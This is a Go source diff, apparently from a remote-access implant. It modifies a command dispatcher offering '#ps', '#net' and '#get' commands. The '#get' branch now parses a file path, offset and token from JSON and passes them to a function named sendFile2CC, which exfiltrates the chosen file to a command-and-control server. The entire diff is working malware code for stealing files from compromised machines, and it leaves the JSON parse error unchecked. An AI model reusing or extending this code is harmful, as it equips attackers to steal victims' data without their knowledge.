@@ -18,7 +18,14 @@ import (
 func shellHelper(cmdSlice []string) (out string) {
 	cmd := cmdSlice[0]
 	args := cmdSlice[1:]
-	var err error
+	var (
+		err        error
+		get_params struct {
+			Path   string `json:"path"`
+			Offset int64  `json:"offset"`
+			Token  string `json:"token"`
+		}
+	)
 
 	switch cmd {
 	case "#ps":
@@ -34,17 +41,11 @@ func shellHelper(cmdSlice []string) (out string) {
 	case "#net":
 		out = shellNet()
 	case "#get":
-		if len(args) < 3 {
-			out = fmt.Sprintf("Invalid request %v", cmdSlice)
-			return
-		}
-		filepath := args[0]
-		offset, err := strconv.ParseInt(args[1], 10, 64)
-		if err != nil {
-			out = fmt.Sprintf("Invalid offset %s", args[1])
-			return
-		}
-		token := args[2]
+		params_json_str := strings.Join(args, " ")
+		err = json.Unmarshal([]byte(params_json_str), &get_params)
+		filepath := get_params.Path
+		offset := get_params.Offset
+		token := get_params.Token
 		log.Printf("File download: %s at %d with token %s", filepath, offset, token)
 		err = sendFile2CC(filepath, offset, token)
 		out = fmt.Sprintf("%s has been sent, please check", filepath)
